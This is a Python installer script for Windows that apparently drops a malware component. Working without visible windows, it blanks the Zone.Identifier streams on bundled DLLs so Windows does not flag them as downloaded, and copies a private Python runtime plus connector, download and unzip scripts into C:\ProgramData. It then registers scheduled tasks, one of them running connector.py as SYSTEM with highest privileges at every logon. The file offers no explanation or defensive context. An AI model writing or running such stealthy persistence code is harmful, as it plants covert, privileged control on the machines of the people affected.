import os
import subprocess

CREATE_NO_WINDOW = 0x08000000
real_path = os.path.realpath(__file__)
dir = os.path.dirname(real_path)

def window():
	subprocess.call(f'schtasks /create /tn jebanyWindows /tr "{dir}\\python\\pythonw.exe {dir}\\program.py" /sc once /st 00:00 /f', creationflags=CREATE_NO_WINDOW)
	subprocess.call('schtasks /run /tn jebanyWindows', creationflags=CREATE_NO_WINDOW)
	#os.system(f'schtasks /create /tn jebanyWindows /tr "{dir}\\python\\python.exe {dir}\\program.py" /sc once /st 00:00 /f')
	#os.system('schtasks /run /tn jebanyWindows')
	

def main():
	subprocess.call(f'cmd /c echo.>{dir}\\python\\Lib\\site-packages\\Python.Runtime.dll:Zone.Identifier', creationflags=CREATE_NO_WINDOW)
	subprocess.call(f'cmd /c echo.>{dir}\\\python\\Lib\\site-packages\\webview\\lib\\Microsoft.Toolkit.Forms.UI.Controls.WebView.dll:Zone.Identifier', creationflags=CREATE_NO_WINDOW)
	window()
	subprocess.call('cmd /c mkdir C:\\ProgramData\\python3810', creationflags=CREATE_NO_WINDOW)
	subprocess.call('cmd /c mkdir C:\\ProgramData\\connector', creationflags=CREATE_NO_WINDOW)

	subprocess.call(f'cmd /c xcopy /E /I /Y {dir}\\python C:\\ProgramData\\python3810', creationflags=CREATE_NO_WINDOW)
	subprocess.call(f'cmd /c copy {dir}\\connector.py C:\\ProgramData\\connector', creationflags=CREATE_NO_WINDOW)

	subprocess.call(f'cmd /c copy {dir}\\download.py C:\\ProgramData\\connector', creationflags=CREATE_NO_WINDOW)
	subprocess.call(f'cmd /c copy {dir}\\unzip.py C:\\ProgramData\\connector', creationflags=CREATE_NO_WINDOW)

	subprocess.call('cmd /c echo.>C:\\ProgramData\\python3810\\Lib\site-packages\\Python.Runtime.dll:Zone.Identifier', creationflags=CREATE_NO_WINDOW)
	subprocess.call('cmd /c echo.>C:\\ProgramData\\python3810\\Lib\\site-packages\\webview\\lib\\Microsoft.Toolkit.Forms.UI.Controls.WebView.dll:Zone.Identifier', creationflags=CREATE_NO_WINDOW)

	subprocess.call(f'schtasks /create /F /ru SYSTEM /sc onlogon /tn Connector /rl highest /tr "C:\ProgramData\\python3810\\python.exe C:\\ProgramData\\connector\\connector.py"', creationflags=CREATE_NO_WINDOW)
	subprocess.call(f'schtasks /run /tn Connector', creationflags=CREATE_NO_WINDOW)

	

if __name__ == '__main__':
	main()
	
